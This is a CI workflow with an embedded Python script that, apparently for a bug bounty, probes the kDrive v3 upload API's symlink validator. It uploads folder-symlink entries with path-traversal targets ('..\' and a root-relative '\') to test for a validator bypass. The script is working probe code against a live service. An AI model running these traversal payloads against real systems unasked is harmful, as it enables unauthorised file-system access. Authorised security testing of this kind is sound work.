name: kDrive v3 symlink validator probe

on:
  push:
    branches: [main]

permissions:
  contents: read

jobs:
  v3-validator-probe:
    runs-on: ubuntu-latest
    env:
      KDRIVE_TOKEN: ${{ secrets.KDRIVE_TOKEN }}
    steps:
      - name: Install minimal dependencies
        run: python -m pip install --quiet requests xxhash

      - name: Probe v3 validator with controlled canaries
        shell: python
        run: |
          import json, os, sys, time
          import requests, xxhash

          token = os.environ.get("KDRIVE_TOKEN", "")
          if not token:
              print("[STOP] missing KDRIVE_TOKEN")
              sys.exit(2)
          print(f"::add-mask::{token}")

          drive_id = 3896576
          ua = "kDrive-YWH-v3-canary/1.0 Infomaniak-YWH-Bugbounty"
          base_headers = {
              "Authorization": f"Bearer {token}",
              "User-Agent": ua,
              "Accept": "application/json",
              "Content-Type": "inode/folder-symlink",
          }
          url = f"https://api.infomaniak.com/3/drive/{drive_id}/upload"

          def upload(label, target):
              now = int(time.time())
              body = target.encode("utf-8")
              params = {
                  "file_name": f"ywh-v3-{label}-{now}",
                  "directory_id": "1",
                  "created_at": str(now),
                  "conflict": "error",
                  "total_size": str(len(body)),
                  "total_chunk_hash": "xxh3:" + xxhash.xxh3_64_hexdigest(body).lower(),
                  "last_modified_at": str(now),
                  "symbolic_link": target,
              }
              r = requests.post(url, headers=base_headers, params=params, data=body, timeout=60)
              print(f"[{label}] HTTP={r.status_code}")
              try:
                  obj = r.json()
              except Exception:
                  print(f"[{label}] non_json=true; body intentionally not printed")
                  return r.status_code, None, False
              err = obj.get("error") or {}
              blob = json.dumps(obj)
              rule = "validation_rule_symbolic_link_target_rule" in blob
              print(f"[{label}] result={obj.get('result')} code={err.get('code')} reason={err.get('reason')} validator_rule={str(rule).lower()}")
              if obj.get("result") == "success":
                  data = obj.get("data") or {}
                  print(f"[{label}] created_file_id={data.get('id')} mime_type={data.get('mime_type')}")
              return r.status_code, obj, rule

          # Baseline: known-invalid parent traversal. Only continue if the v3 validator actually rejects it.
          status, obj, rule = upload("baseline-parent", r"..\kdrive-bounty-canary-target")
          if obj is None:
              print("[RESULT] V3_FORMAT_OR_ROUTE_INCONCLUSIVE")
              sys.exit(0)
          if obj.get("result") == "success":
              print("[RESULT] V3_BASELINE_ACCEPTED_STOP_NO_BYPASS_TEST")
              sys.exit(0)
          if not rule:
              print("[RESULT] V3_BASELINE_REJECTED_FOR_OTHER_REASON_STOP")
              sys.exit(0)

          print("[GATE] Baseline hit the intended symbolic-link validator; testing one Windows root-relative form.")
          status2, obj2, rule2 = upload("root-relative", r"\kdrive-bounty-canary-target")
          if obj2 is None:
              print("[RESULT] ROOT_RELATIVE_INCONCLUSIVE")
          elif obj2.get("result") == "success":
              print("[RESULT] V3_VALIDATOR_BYPASS_CONFIRMED_ROOT_RELATIVE_ACCEPTED")
          elif rule2:
              print("[RESULT] V3_ROOT_RELATIVE_REJECTED_BY_VALIDATOR")
          else:
              print("[RESULT] V3_ROOT_RELATIVE_REJECTED_OTHER_REASON")
